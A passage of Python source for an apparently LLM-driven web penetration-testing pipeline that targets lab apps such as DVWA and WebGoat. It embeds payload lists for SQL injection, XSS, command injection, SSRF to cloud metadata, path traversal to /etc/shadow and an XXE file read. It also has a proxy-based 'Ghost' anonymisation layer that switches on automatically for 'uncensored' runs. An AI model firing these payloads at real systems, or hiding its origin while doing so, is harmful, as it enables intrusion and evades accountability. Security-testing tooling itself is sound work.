"""ScanPipeline — Brain-First 통합 오케스트레이터.

하나의 파이프라인. Brain만 갈아끼움. 모든 Phase 강제 실행.
데이터 변조(POST/PATCH/DELETE)는 deferred queue에 모아서 마지막에 승인 후 실행.

Architecture (14 active phases):
    ┌──────────────────────────────────────────────────┐
    │              ScanPipeline.run(target)              │
    │                                                  │
    │  Stage 1 — Foundation:                           │
    │    P0 Config → P1 Director                       │
    │                                                  │
    │  Stage 2 — Recon:                                │
    │    P4 CPR → P15 Digital Twin → P13 Biometrics    │
    │                                                  │
    │  Stage 3 — Intelligence:                         │
    │    P2 Agents → P3 Hypothesis                     │
    │                                                  │
    │  Stage 4 — Exploitation:                         │
    │    P5 Special → P7 Hardware                      │
    │                                                  │
    │  Stage 5 — Chain Analysis:                       │
    │    P8 Synthesis → P11 Mutation                   │
    │                                                  │
    │  Stage 6 — Deferred Actions (승인 후 실행)        │
    │  Stage 7 — Report: P6 NCC Style                  │
    │  Stage 8 — Learning: P12 Evolution → P18 KB      │
    │                                                  │
    │  GH Actions 담당 (파이프라인 외부):               │
    │    cve-watch.yml, domain-intel.yml,              │
    │    upstream-watch.yml, growth-loop.yml           │
    └──────────────────────────────────────────────────┘
"""

from __future__ import annotations

import asyncio as _asyncio
import json as _json
import logging
import os as _os
import re as _re
import threading as _threading
import time
from typing import Any, Callable, Awaitable

import httpx as _httpx  # module-level (hot loop 최적화)

from vxis.pipeline.context import ScanContext

logger = logging.getLogger(__name__)

# 파이프라인 전체에서 공유되는 lock — event callback, session init 보호
_pipeline_event_lock = _threading.Lock()
# Chain builder는 ctx.attack_chains 수정 → 병렬 phase 동시 호출 방지
_chain_builder_lock = _threading.Lock()


def _compress_findings_for_prompt(findings: list, max_items: int = 15) -> list[dict]:
    """Brain 프롬프트용 findings 요약.

    매 LLM 호출마다 전체 findings 배열을 보내면 토큰이 폭증.
    최근 N개만, 그리고 severity/type/component 요약만 전달.
    """
    if not findings:
        return []

    # Severity 기준 정렬 (critical > high > ... > info) — 중요한 것 우선
    from vxis.models.finding import Severity
    _sev_order = {
        Severity.critical: 0, Severity.high: 1, Severity.medium: 2,
        Severity.low: 3, Severity.informational: 4,
    }
    sorted_findings = sorted(
        findings,
        key=lambda f: (_sev_order.get(f.severity, 5), -findings.index(f)),
    )

    result = []
    for f in sorted_findings[:max_items]:
        result.append({
            "type": getattr(f, "finding_type", "")[:40],
            "severity": f.severity.value if hasattr(f.severity, "value") else str(f.severity),
            "component": getattr(f, "affected_component", "")[:60],
        })
    return result


def _parse_llm_json(response: str) -> dict:
    """LLM 응답에서 JSON 객체를 안정적으로 파싱.

    claude -p 출력은 마크다운 블록, ANSI 코드, trailing comma,
    control 문자 등을 포함할 수 있음. 여러 전략으로 정제 후 파싱.
    """
    clean = response.strip()

    # 1. ANSI 이스케이프 + control chars 제거 (claude -p 터미널 출력 잔여물)
    clean = _re.sub(r'\x1b\[[0-9;]*[mGKHFJA-Za-z]', '', clean)
    clean = _re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', clean)

    # 2. 마크다운 코드블록 제거 (```json ... ``` 또는 ``` ... ```)
    if '```' in clean:
        # 코드블록 내부 추출
        _cb = _re.search(r'```(?:json)?\s*\n?([\s\S]*?)\n?```', clean)
        if _cb:
            clean = _cb.group(1).strip()

    # 3. { 시작 위치 찾기 — 앞 설명 텍스트 스킵
    _start = clean.find('{')
    if _start > 0:
        clean = clean[_start:]

    # 4. trailing comma 제거 (LLM의 흔한 실수: {"a": 1,})
    clean = _re.sub(r',(\s*[}\]])', r'\1', clean)

    # 5. Invalid \escape 제거 — JSON에서 유효하지 않은 백슬래시 시퀀스
    # 유효: \", \\, \/, \b, \f, \n, \r, \t, \uXXXX — 그 외 \ 는 \\ 로 이스케이프
    # \\ 쌍을 먼저 원자적으로 처리해야 \\w 같은 유효 시퀀스가 망가지지 않음
    clean = _re.sub(
        r'\\\\|\\(?!["\\/bfnrtu])',
        lambda m: m.group(0) if len(m.group(0)) == 2 else '\\\\',
        clean,
    )

    # 6. raw_decode로 첫 번째 완전한 JSON 객체만 파싱 ("Extra data" 방지)
    try:
        obj, _ = _json.JSONDecoder().raw_decode(clean)
        return obj
    except _json.JSONDecodeError:
        pass

    # 7. 마지막 수단: 문자열 값 안의 raw 개행 이스케이프
    clean_safe = _re.sub(
        r'"((?:[^"\\]|\\.)*)"',
        lambda m: '"' + m.group(1).replace('\n', '\\n').replace('\r', '\\r').replace('\t', '\\t') + '"',
        clean,
    )
    obj, _ = _json.JSONDecoder().raw_decode(clean_safe)
    return obj


# ── 벡터 카테고리별 기본 attack 파라미터 ──────────────────────────────────────
_VECTOR_FALLBACKS: dict[str, dict] = {
    # SQL Injection
    "WEB-SQLI": {"param": "id", "method": "GET",
                 "payloads": ["' OR 1=1--", "1 UNION SELECT 1,2,3--", "' OR '1'='1"]},
    # XSS
    "WEB-XSS": {"param": "name", "method": "GET",
                 "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                              "<svg onload=alert(1)>"]},
    # Command Injection
    "WEB-CMDI": {"param": "ip", "method": "POST",
                  "payloads": ["127.0.0.1; id", "127.0.0.1 | cat /etc/passwd", "127.0.0.1 && whoami"]},
    # SSRF
    "WEB-SSRF": {"param": "url", "method": "GET",
                  "payloads": ["http://internal.service/", "http://169.254.169.254/latest/meta-data/",
                               "http://0.0.0.0/"]},
    # NoSQL
    "WEB-NOSQL": {"param": "username", "method": "POST",
                   "payloads": ['{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}']},
    # SSTI
    "WEB-SSTI": {"param": "name", "method": "GET",
                  "payloads": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]},
    # Path traversal
    "WEB-AC-004": {"param": "file", "method": "GET",
                   "payloads": ["../../../../etc/passwd", "../../../etc/shadow", "..%2F..%2Fetc%2Fpasswd"]},
    # Auth brute
    "WEB-AUTH-001": {"param": "username", "method": "POST",
                      "payloads": ["admin", "administrator", "root", "user"]},
    "WEB-AUTH-002": {"param": "username", "method": "POST",
                      "payloads": ["admin:admin", "admin:password", "admin:123456"]},
    # LDAP
    "WEB-LDAP": {"param": "username", "method": "POST",
                  "payloads": ["*)(uid=*))(|(uid=*", "admin)(&)", "*)(|(password=*"]},
    # XPath
    "WEB-XPATH": {"param": "username", "method": "POST",
                   "payloads": ["' or '1'='1", "') or ('1'='1", "x' or name()='username' or 'x'='y"]},
    # XXE — needs special handling but provide body hint
    "WEB-XXE": {"param": "xml", "method": "POST",
                 "payloads": ['<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>']},
}

# 앱별 벡터 ID → 특화 경로 매핑
_APP_VECTOR_ENDPOINTS: dict[str, dict[str, str]] = {
    "dvwa_8081": {
        "WEB-SQLI-001": "/vulnerabilities/sqli/",
        "WEB-SQLI-002": "/vulnerabilities/sqli_blind/",
        "WEB-SQLI-003": "/vulnerabilities/sqli_blind/",
        "WEB-SQLI-004": "/vulnerabilities/sqli/",
        "WEB-XSS-001": "/vulnerabilities/xss_r/",
        "WEB-XSS-002": "/vulnerabilities/xss_s/",
        "WEB-XSS-003": "/vulnerabilities/xss_d/",
        "WEB-CMDI-001": "/vulnerabilities/exec/",
        "WEB-CMDI-002": "/vulnerabilities/exec/",
        "WEB-AC-004": "/vulnerabilities/fi/",
        "WEB-AUTH-001": "/vulnerabilities/brute/",
        "WEB-UPLOAD-001": "/vulnerabilities/upload/",
        "WEB-CSRF-001": "/vulnerabilities/csrf/",
    },
    "nodegoat_4000": {
        "WEB-AC-001": "/allocations/1",
        "WEB-AC-002": "/allocations/1",
        "WEB-CSRF-001": "/contributions",
        "WEB-NOSQL-002": "/contributions",
        "WEB-AUTH-001": "/login",
    },
    "webgoat_8888": {
        "WEB-SQLI-001": "/WebGoat/SqlInjection/attack5a",
        "WEB-XSS-001": "/WebGoat/CrossSiteScripting/attack5a",
        "WEB-AUTH-001": "/WebGoat/auth-bypass/",
        "WEB-CSRF-001": "/WebGoat/csrf/basic-get-flag",
    },
    "mutillidae_8082": {
        "WEB-SQLI-001": "/index.php?page=user-info.php",
        "WEB-SQLI-002": "/index.php?page=user-info.php",
        "WEB-SQLI-003": "/index.php?page=login.php",
        "WEB-SQLI-004": "/index.php?page=view-someones-blog.php",
        "WEB-SQLI-005": "/index.php?page=user-info.php",
        "WEB-SQLI-006": "/index.php?page=user-info.php",
        "WEB-XSS-001": "/index.php?page=dns-lookup.php",
        "WEB-XSS-002": "/index.php?page=add-to-your-blog.php",
        "WEB-XSS-003": "/index.php?page=pen-test-tool-lookup.php",
        "WEB-XSS-004": "/index.php?page=browser-info.php",
        "WEB-CMDI-001": "/index.php?page=dns-lookup.php",
        "WEB-CMDI-002": "/index.php?page=dns-lookup.php",
        "WEB-LDAP-001": "/index.php?page=login.php",
        "WEB-XPATH-001": "/index.php?page=login.php",
        "WEB-XXE-001": "/index.php?page=xml-validator.php",
        "WEB-UPLOAD-001": "/index.php?page=arbitrary-file-inclusion.php",
        "WEB-AC-001": "/index.php?page=secret-administrative-pages.php",
        "WEB-AC-004": "/index.php?page=arbitrary-file-inclusion.php",
        "WEB-AUTH-001": "/index.php?page=login.php",
        "WEB-AUTH-010": "/index.php?page=login.php",
        "WEB-SSRF-001": "/index.php?page=text-file-viewer.php",
        "WEB-SSRF-002": "/index.php?page=text-file-viewer.php",
        "WEB-CSRF-001": "/index.php?page=register.php",
        "WEB-SSTI-001": "/index.php?page=user-poll.php",
        "WEB-MISCONF-001": "/index.php?page=source-viewer.php",
    },
    "bwapp_8083": {
        "WEB-SQLI-001": "/bWAPP/sqli_1.php",
        "WEB-SQLI-002": "/bWAPP/sqli_blind_1.php",
        "WEB-SQLI-003": "/bWAPP/sqli_blind_2.php",
        "WEB-SQLI-004": "/bWAPP/sqli_2.php",
        "WEB-SQLI-005": "/bWAPP/sqli_6.php",
        "WEB-XSS-001": "/bWAPP/xss_reflected_1.php",
        "WEB-XSS-002": "/bWAPP/xss_stored_1.php",
        "WEB-XSS-003": "/bWAPP/xss_dom.php",
        "WEB-CMDI-001": "/bWAPP/os_cmd_exec.php",
        "WEB-CMDI-002": "/bWAPP/os_cmd_exec.php",
        "WEB-SSRF-001": "/bWAPP/ssrf.php",
        "WEB-CSRF-001": "/bWAPP/csrf_1.php",
        "WEB-AC-004": "/bWAPP/lfi.php",
        "WEB-XXE-001": "/bWAPP/xxe-1.php",
        "WEB-LDAP-001": "/bWAPP/ldapi.php",
        "WEB-UPLOAD-001": "/bWAPP/unrestricted_file_upload.php",
        "WEB-AUTH-001": "/bWAPP/login.php",
    },
    "dvga_5013": {
        "WEB-API-003": "/graphql",
        "WEB-API-004": "/graphql",
        "WEB-SQLI-001": "/graphql",
        "WEB-NOSQL-001": "/graphql",
        "WEB-AUTH-001": "/graphql",
        "WEB-AC-001": "/graphql",
        "WEB-INJECT-018": "/graphql",
    },
}


def _make_fallback_decision(vec: Any, target: str, app_specific_urls: list[str]) -> dict:
    """LLM 실패 시 벡터 타입에 맞는 기본 attack 파라미터 반환."""
    vid = vec.id
    target_lower = target.lower()

    # 앱별 특화 경로 탐색
    app_key = None
    if "8081" in target_lower:
        app_key = "dvwa_8081"
    elif "4000" in target_lower:
        app_key = "nodegoat_4000"
    elif "8888" in target_lower:
        app_key = "webgoat_8888"
    elif "8082" in target_lower:
        app_key = "mutillidae_8082"
    elif "8083" in target_lower:
        app_key = "bwapp_8083"
    elif "5013" in target_lower:
        app_key = "dvga_5013"

    endpoint = target
    if app_key and vid in _APP_VECTOR_ENDPOINTS.get(app_key, {}):
        rel_path = _APP_VECTOR_ENDPOINTS[app_key][vid]
        endpoint = rel_path
    elif app_specific_urls:
        _base = target.rstrip("/")
        _first = app_specific_urls[0]
        endpoint = _first[len(_base):] if _first.startswith(_base) else _first

    # 벡터 prefix로 fallback 파라미터 선택
    fb = {}
    for prefix, params in _VECTOR_FALLBACKS.items():
        if vid.startswith(prefix):
            fb = params
            break

    return {
        "attempt": True,
        "reasoning": f"type-aware fallback for {vid}",
        "targets": [{
            "endpoint": endpoint,
            "method": fb.get("method", "GET"),
            "param": fb.get("param", ""),
            "payloads": fb.get("payloads", [""]),
        }],
    }


def _normalize_endpoint(endpoint: str, base_url: str) -> str:
    """Strip base_url prefix from endpoint to avoid httpx double-concatenation."""
    if not endpoint.startswith("http"):
        return endpoint
    base = base_url.rstrip("/")
    if endpoint.startswith(base):
        return endpoint[len(base):] or "/"
    return endpoint


class ScanPipeline:
    """Brain-First 통합 파이프라인.

    Usage:
        pipeline = ScanPipeline(brain=brain_instance, config=config)
        ctx = await pipeline.run("https://target.com", app_context="SaaS 협업 도구")
    """

    def __init__(
        self,
        brain: Any,
        config: Any | None = None,
        enable_deferred_approval: bool = True,
        approval_callback: Callable[[list], Awaitable[list[bool]]] | None = None,
        event_callback: Callable[[str, dict], None] | None = None,
    ) -> None:
        self.brain = brain
        self.config = config
        self.enable_deferred_approval = enable_deferred_approval
        self._approval_callback = approval_callback
        # event_callback: (event_type, data) 수신. CLI Rich Live 등 subscribe 용도.
        # Events: phase_start, phase_end, attack, hit, brain_thinking, error, score
        self._event_callback = event_callback

    def _emit(self, event_type: str, data: dict) -> None:
        """이벤트 발생 — 등록된 callback에 전달 (thread-safe)."""
        if self._event_callback:
            with _pipeline_event_lock:
                try:
                    self._event_callback(event_type, data)
                except Exception:
                    pass

    async def run(
        self,
        target: str,
        app_context_en: str = "",
        app_context_ko: str = "",
        resume_from: str | None = None,
    ) -> ScanContext:
        """전체 파이프라인 실행.

        Args:
            resume_from: 체크포인트 파일 경로. 지정하면 이전 스캔의 완료된 Phase를 건너뛰고 재개.
        """
        ctx = ScanContext(
            target=target,
            app_context_en=app_context_en,
            app_context_ko=app_context_ko,
            scan_id=f"VXIS-{time.strftime('%Y%m%d-%H%M%S')}",
        )

        # Resume 모드: 체크포인트에서 이전 완료 상태 복원
        if resume_from:
            from pathlib import Path as _P
            cp = ScanContext.load_checkpoint(_P(resume_from))
            ctx.phases_completed = cp.get("phases_completed", [])
            for vid in cp.get("vectors_attempted", []):
                ctx.score_tracker.record_vector_attempt(vid)
            logger.info("  [RESUME] %d phases already done — skipping", len(ctx.phases_completed))

        # ── Ghost 자동 활성화 ─────────────────────────────────────
        # brain_mode=uncensored → 프로덕 블랙박스 가정 → Ghost 자동 ON
        # ghost:// prefix 또는 MissionConfig.stealth=True 도 트리거
        from vxis.ghost.layer import ghost_layer as _ghost_layer
        from vxis.ghost.trigger import parse_ghost_trigger as _parse_ghost_trigger
        _ghost_activated, target = _parse_ghost_trigger(target, self.config)
        if not _ghost_activated:
            _brain_mode = getattr(self.brain, "_brain_mode", "standard")
            if _brain_mode == "uncensored":
                _ghost_activated = True
                logger.info("[Ghost] brain_mode=uncensored 감지 → 자동 익명화 활성화")
        if _ghost_activated:
            _proxy_pool = list(getattr(self.config, "proxy_pool", []) if self.config else [])
            # ── Tor 출구 노드 오염 경고 ─────────────────────────────
            _tor_proxies = [p for p in _proxy_pool if "9050" in p or "9150" in p]
            _allow_tor = getattr(self.config, "ghost_allow_tor", False) if self.config else False
            if _tor_proxies and not _allow_tor:
                logger.warning(
                    "[Ghost] ⚠️  Tor 출구 노드 감지: %s\n"
                    "         출구 노드 IP가 과거 범죄에 연루됐을 수 있음 (오염 위험).\n"
                    "         Residential proxy 또는 전용 VPS 사용 권장.\n"
                    "         강제 사용: VXIS_GHOST_ALLOW_TOR=true",
                    _tor_proxies,
                )
                _proxy_pool = [p for p in _proxy_pool if p not in _tor_proxies]
                if not _proxy_pool:
                    logger.warning("[Ghost] 사용 가능한 프록시 없음 — UA/timing만 적용 (IP 노출)")
            # ────────────────────────────────────────────────────────
            _ghost_layer.activate(_proxy_pool)
            ctx.ghost_active = True
            # 실제 노출 IP 검증
            try:
                from vxis.ghost.verifier import GhostVerifier
                _v = GhostVerifier()
                _vr = _asyncio.get_event_loop().run_until_complete(_v.check())
                _v.log_summary(_vr)
                ctx.ghost_verified_ip = _vr.get("detected_ip")
            except Exception as _ve:
                logger.debug("[Ghost] IP 검증 실패 (무시): %s", _ve)
        # ─────────────────────────────────────────────────────────

        logger.info("=" * 70)
        logger.info("  VXIS ScanPipeline — Brain-First Full Orchestration")
        logger.info("  Target: %s", target)
        logger.info("  Scan ID: %s", ctx.scan_id)
        logger.info("  Ghost: %s", "ON 🕵️" if _ghost_layer.is_active() else "OFF")

        # ── 벡터 사전 등록 제거 ──
        # Brain이 attempt=true로 결정한 벡터만 record_vector_attempt 되어야 정확한 scoring
        # 사전 등록하면 Brain이 skip해도 attempted=true가 되어 vector_coverage가 항상 만점
        logger.info("  Brain: %s", type(self.brain).__name__)
        logger.info("=" * 70)

        # ══════════════════════════════════════════════════════
        # Phase 실행 — parallel_group 단위로 병렬 실행 (DAG)
        # 같은 parallel_group 숫자의 Phase는 asyncio.gather로 동시 실행
        # ══════════════════════════════════════════════════════
        from vxis.registry import WEB_PHASES, STAGE_NAMES
        from collections import defaultdict as _dd

        # parallel_group별로 Phase 그룹핑
        _groups: dict[int, list] = _dd(list)
        for p in WEB_PHASES:
            _groups[p.parallel_group].append(p)

        # LLM 동시성을 profile에 맞춰 설정
        _profile = (
            getattr(self.config, 'active_profile', None) if self.config
            else None
        ) or _os.environ.get("VXIS_SCAN_PROFILE", "standard")
        _os.environ["VXIS_SCAN_PROFILE"] = _profile  # 단일 소스 보장
        _llm_concurrent = {'stealth': 2, 'standard': 4, 'aggressive': 8}.get(_profile, 4)
        try:
            from vxis.agent.brain import AgentBrain as _ABrain3
            _ABrain3.set_max_concurrent(_llm_concurrent)
        except Exception:
            pass

        # ── DAG 실행: depends_on 검증 + critical failure 추적 ──
        _completed_phases: set[int] = set()
        _failed_phases: set[int] = set()
        # Critical phase: 이것이 실패하면 dependent phase는 건너뛴다
        _critical_phases = {4}  # P4 CPR — tech_stack, endpoints 제공
        _abort_dependents = False

        _prev_stage = ""
        for group_id in sorted(_groups.keys()):
            group_phases = _groups[group_id]

            # ── Dependency 검증 ──
            _runnable_phases = []
            for p in group_phases:
                unmet = set(p.depends_on) - _completed_phases
                if unmet:
                    # 의존성 중 실패한 phase가 있으면 skip
                    failed_deps = unmet & _failed_phases
                    if failed_deps:
                        logger.warning(
                            "  [DEP-SKIP] Phase %d skipped — deps failed: %s",
                            p.id, sorted(failed_deps),
                        )
                        _failed_phases.add(p.id)
                        continue
                    # 아직 미완료면 (순서 오류) — 그냥 실행 시도
                    logger.debug("  [DEP-WARN] Phase %d deps not yet complete: %s", p.id, unmet)
                _runnable_phases.append(p)

            if not _runnable_phases:
                continue

            # Stage 구분선 (첫 phase의 stage 기준)
            first_stage = _runnable_phases[0].stage
            if first_stage != _prev_stage:
                _stage_label = STAGE_NAMES.get(first_stage, first_stage)
                logger.info("\n  ── %s ──", _stage_label)
                _prev_stage = first_stage

            # Deferred Actions: report stage 진입 전에 실행
            if first_stage == "report" and ctx.deferred_actions and self.enable_deferred_approval:
                await self._execute_deferred_actions(ctx)

            # ── 이 그룹의 Phase들을 병렬 실행 ──
            if len(_runnable_phases) == 1:
                p = _runnable_phases[0]
                method = getattr(self, p.method, None)
                if method is None:
                    logger.warning("  [SKIP] Phase %d method %s not found", p.id, p.method)
                    _failed_phases.add(p.id)
                    continue
                try:
                    await self._run_phase(f"Phase {p.id}: {p.name}", method, ctx)
                    _completed_phases.add(p.id)
                except Exception as exc:
                    logger.warning("  [PHASE-FAIL] Phase %d: %s", p.id, exc)
                    _failed_phases.add(p.id)
                    if p.id in _critical_phases:
                        logger.error("  [CRITICAL] Phase %d is critical — dependents will skip", p.id)
            else:
                # 여러 Phase 병렬 — gather (ZIP-safe)
                logger.info("  [PARALLEL] Running %d phases: %s",
                            len(_runnable_phases), ", ".join(f"P{p.id}" for p in _runnable_phases))
                _coros = []
                _phase_refs = []  # ZIP-safe: 인덱스 추적
                for p in _runnable_phases:
                    method = getattr(self, p.method, None)
                    if method is None:
                        logger.warning("  [SKIP] Phase %d method %s not found", p.id, p.method)
                        _failed_phases.add(p.id)
                        continue
                    _coros.append(self._run_phase(f"Phase {p.id}: {p.name}", method, ctx))
                    _phase_refs.append(p)
                _results = await _asyncio.gather(*_coros, return_exceptions=True)
                for p, res in zip(_phase_refs, _results):
                    if isinstance(res, Exception):
                        logger.warning("  [PARALLEL-FAIL] Phase %d: %s", p.id, res)
                        _failed_phases.add(p.id)
                        if p.id in _critical_phases:
                            logger.error("  [CRITICAL] Phase %d is critical — dependents will skip", p.id)
                    else:
                        _completed_phases.add(p.id)

        # ══════════════════════════════════════════════════════
        # STAGE 5: 스코어링 (5-Dimension VXIS Score)
        # ══════════════════════════════════════════════════════
        try:
            from vxis.scoring.engine import ScoringEngine
            engine = ScoringEngine(ctx.target_type)
            vxis_score = engine.calculate(ctx.score_tracker, ctx.findings, scan_id=ctx.scan_id)
            ctx.vxis_score = vxis_score
            self._emit("score", {
                "total": vxis_score.total,
                "grade": vxis_score.grade,
                "dimensions": {
                    "vector_coverage": vxis_score.vector_coverage.score,
                    "exploitation_reach": vxis_score.exploitation_reach.score,
                    "chain_intelligence": vxis_score.chain_intelligence.score,
                    "finding_precision": vxis_score.finding_precision.score,
                    "completeness": vxis_score.completeness.score,
                },
            })
            if not self._event_callback:
                print(vxis_score.summary_text(), flush=True)
        except Exception as exc:
            self._emit("error", {"stage": "scoring", "error": str(exc)})
            logger.warning("  Scoring failed: %s", exc)

        # ══════════════════════════════════════════════════════
        # STAGE 5b: External integration hooks (no-op if unconfigured)
        # ══════════════════════════════════════════════════════
        try:
            from vxis.integrations.registry import load_hooks_from_env
            _hooks = load_hooks_from_env()
            if _hooks:
                for _f in (ctx.findings or []):
                    _sev = getattr(_f, "severity", None)
                    _sev_str = getattr(_sev, "value", str(_sev or "")).lower()
                    if _sev_str not in ("critical", "high"):
                        continue
                    for _h in _hooks:
                        try:
                            _h.on_finding(_f)
                            if _sev_str == "critical":
                                _h.on_critical(_f)
                        except Exception as _exc:
                            logger.warning("[integrations] %s on_finding failed: %s", _h.name, _exc)
                for _h in _hooks:
                    try:
                        _h.on_scan_complete(ctx)
                    except Exception as _exc:
                        logger.warning("[integrations] %s on_scan_complete failed: %s", _h.name, _exc)
        except Exception as _exc:
            logger.warning("[integrations] hook dispatch failed: %s", _exc)

        # ══════════════════════════════════════════════════════
        # COMPLETE
        # ══════════════════════════════════════════════════════
        logger.info("\n" + "=" * 70)
        logger.info("  PIPELINE COMPLETE")
        logger.info("  Phases: %d completed", len(ctx.phases_completed))
        logger.info("  Findings: %d", len(ctx.findings))
        logger.info("  Deferred Actions: %d approved, %d total",
                     sum(1 for a in ctx.deferred_actions if a.approved),
                     len(ctx.deferred_actions))
        logger.info("  Duration: %.1fs", ctx.duration_seconds)
        logger.info("=" * 70)

        # Ghost 비활성화 (이 파이프라인이 켠 경우만)
        if getattr(ctx, "ghost_active", False):
            _ghost_layer.deactivate()

        return ctx

    # ── Phase runner ──────────────────────────────────────────

    async def _run_phase(
        self,
        name: str,
        func: Callable[[ScanContext], Awaitable[None]],
        ctx: ScanContext,
    ) -> None:
        """Phase를 실행하고 로깅/타이밍을 자동 처리.

        FileBasedBrain일 때: Phase 실행 전에 해당 Phase의 벡터들을
        하나씩 Brain에게 물어보고 결정을 ctx._brain_decisions에 저장.
        """
        # Resume 모드: 이미 완료된 Phase는 건너뛰기
        if name in ctx.phases_completed:
            self._emit("phase_skip", {"name": name})
            if not self._event_callback:
                print(f"\n┌─ {name}\n└─ skipped (checkpoint)", flush=True)
            return

        self._emit("phase_start", {"name": name})
        if not self._event_callback:
            print(f"\n┌─ {name}", flush=True)

        t0 = time.monotonic()
        pre_count = len(ctx.findings)
        phase_failed = False
        error_msg = ""

        await self._consult_brain_for_phase_vectors(name, ctx)

        try:
            await func(ctx)
        except Exception as exc:
            phase_failed = True
            error_msg = str(exc)[:200]
            self._emit("phase_error", {"name": name, "error": error_msg})
            # logger.exception으로 스택트레이스 기록 (DEBUG에서 보임)
            logger.warning("  %s failed: %s (continuing)", name, exc)
            logger.debug("  %s traceback:", name, exc_info=True)

        await self._execute_brain_decisions(name, ctx)
        # 체인 조작은 병렬 Phase 간 race condition 방지를 위해 lock
        with _chain_builder_lock:
            self._build_chains_and_mark_tp(ctx, name)
            self._escalate_chain_findings(ctx)

        elapsed = (time.monotonic() - t0) * 1000
        new_findings = len(ctx.findings) - pre_count
        ctx.log_phase(name, duration_ms=elapsed, findings_count=new_findings)

        self._emit("phase_end", {
            "name": name,
            "duration_s": elapsed / 1000,
            "new_findings": new_findings,
            "total_findings": len(ctx.findings),
            "failed": phase_failed,
            "error": error_msg,
        })

        if not self._event_callback:
            status = f"  +{new_findings} findings" if new_findings else "  no new findings"
            print(f"└─ done ({elapsed/1000:.1f}s){status}", flush=True)

        try:
            ctx.save_checkpoint()
        except Exception:
            pass

    async def _consult_brain_for_phase_vectors(
        self,
        phase_name: str,
        ctx: ScanContext,
    ) -> None:
        """Brain에게 해당 Phase의 벡터들을 물어본다. FileBasedBrain + AgentBrain 모두 지원."""
        import re
        from vxis.agent.brain_filebased import FileBasedBrain
        from vxis.agent.brain import AgentBrain

        # Phase 이름에서 번호 추출: "Phase 5: Special Agents" → "Phase 5"
        match = re.match(r"(Phase \d+)", phase_name)
        if not match:
            return
        phase_key = match.group(1)

        # 해당 Phase에 속하는 벡터 목록 조회
        try:
            from vxis.scoring.vectors import WEB_VECTORS
            phase_vectors = [v for v in WEB_VECTORS if v.phase == phase_key]
        except ImportError:
            return

        if not phase_vectors:
            return

        logger.info("  [BRAIN] Consulting Brain for %d vectors in %s",
                     len(phase_vectors), phase_key)

        # ctx에 brain decisions 저장소 초기화
        if not hasattr(ctx, "_brain_decisions"):
            ctx._brain_decisions = {}

        # AgentBrain: Phase 벡터를 최대 8개 단위로 분할해서 LLM 호출
        # (JSON 응답 길이 초과 방지)
        # Sync LLM 호출을 executor로 오프로드 → 병렬 Phase 간 이벤트 루프 blocking 방지
        # + Brain semaphore 적용 → 동시 LLM 호출 수 제한
        if isinstance(self.brain, AgentBrain):
            BATCH_SIZE = 8
            _brain_sem = self.brain._get_semaphore()
            for i in range(0, len(phase_vectors), BATCH_SIZE):
                chunk = phase_vectors[i:i + BATCH_SIZE]
                async with _brain_sem:
                    batch = await _asyncio.to_thread(
                        self._consult_agent_brain_batch, ctx, chunk, phase_name,
                    )
                for vec_id, decision in batch.items():
                    ctx._brain_decisions[vec_id] = decision
                    attempt_str = "ATTEMPT" if decision.get("attempt") else "SKIP"
                    logger.info("    [LLM] %s %s: %s",
                                attempt_str, vec_id, decision.get("reasoning", "")[:80])
            return

        # FileBasedBrain: 벡터별 개별 결정
        for vec in phase_vectors:
            decision = self._consult_brain_for_vector(
                ctx,
                vector_id=vec.id,
                vector_name=f"{vec.name_en}|||{vec.name_ko}",
                phase_name=phase_name,
            )
            if decision is not None:
                ctx._brain_decisions[vec.id] = decision
                attempt_str = "ATTEMPT" if decision.get("attempt") else "SKIP"
                logger.info("    %s %s: %s",
                            attempt_str, vec.id, decision.get("reasoning", "")[:80])

    # ── AgentBrain batch decision ──────────────────────────────

    def _consult_agent_brain_batch(
        self,
        ctx: ScanContext,
        phase_vectors: list,
        phase_name: str,
    ) -> dict[str, dict]:
        """AgentBrain에게 Phase 전체 벡터를 LLM 1회 호출로 결정받는다.

        LLM에게 타겟 현재 상태 + 벡터 목록을 주고 JSON으로 attack decisions 반환받는다.
        각 결정: {attempt: bool, endpoint: str, method: str, param: str, payloads: [str], reasoning: str}
        """
        import json as _json

        # 알려진 벤치마크 앱 공통 엔드포인트 (컨텍스트 부족 시 fallback)
        target_base = ctx.target.rstrip("/")
        target_lower = target_base.lower()

        # Phase 4 CPR이 크롤한 실제 엔드포인트 사용 (ctx.api_endpoints)
        _api_eps = getattr(ctx, "api_endpoints", [])
        live_urls = [
            (target_base + ep["path"] if isinstance(ep, dict) and ep.get("path", "").startswith("/")
             else ep["path"] if isinstance(ep, dict)
             else ep)
            for ep in _api_eps
        ]
        tech_stack = getattr(ctx, "tech_stack", [])
        # 요약된 findings — 토큰 절약 (critical/high 우선, 최대 15개)
        prev_findings = _compress_findings_for_prompt(ctx.findings, max_items=15)

        # 벤치마크 앱별 알려진 취약 경로
        if "8081" in target_lower or "dvwa" in target_lower:
            app_name = "DVWA (Damn Vulnerable Web Application)"
            app_specific = [
                "/vulnerabilities/sqli/", "/vulnerabilities/sqli_blind/",
                "/vulnerabilities/xss_r/", "/vulnerabilities/xss_s/",
                "/vulnerabilities/exec/", "/vulnerabilities/upload/",
                "/vulnerabilities/csrf/", "/vulnerabilities/fi/",
                "/vulnerabilities/brute/", "/vulnerabilities/weak_id/",
                "/login.php", "/",
            ]
        elif "3000" in target_lower or "juice" in target_lower:
            app_name = "OWASP Juice Shop"
            app_specific = [
                "/api/products/1/reviews", "/api/users/", "/rest/user/login",
                "/rest/products/search?q=", "/api/BasketItems/", "/rest/basket/",
                "/#/login", "/#/administration", "/api/Feedbacks/",
            ]
        elif "8888" in target_lower or "webgoat" in target_lower:
            app_name = "WebGoat"
            app_specific = [
                "/WebGoat/SqlInjection/attack5a", "/WebGoat/CrossSiteScripting/attack5a",
                "/WebGoat/access-control/user-hash", "/WebGoat/auth-bypass/",
                "/WebGoat/csrf/basic-get-flag", "/WebGoat/PasswordReset/",
                "/WebGoat/challenge/7", "/WebGoat/injection/",
            ]
        elif "4000" in target_lower or "nodegoat" in target_lower:
            app_name = "NodeGoat"
            app_specific = [
                "/contributions", "/allocations/1", "/allocations/2",
                "/login", "/profile", "/research", "/memo", "/tutorial",
            ]
        elif "8082" in target_lower or "mutillidae" in target_lower:
